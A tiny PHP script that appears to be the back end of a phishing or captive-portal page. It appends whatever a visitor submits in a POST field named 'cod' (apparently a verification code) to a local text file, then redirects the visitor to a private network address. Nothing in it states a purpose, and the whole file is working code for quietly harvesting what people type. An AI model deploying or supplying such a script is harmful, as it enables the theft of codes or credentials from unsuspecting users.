<?php
file_put_contents("cod.txt", "\nCod: " . $_POST['cod'] . "\n", FILE_APPEND);
header('Location: http://192.168.1.5:8080');
?>
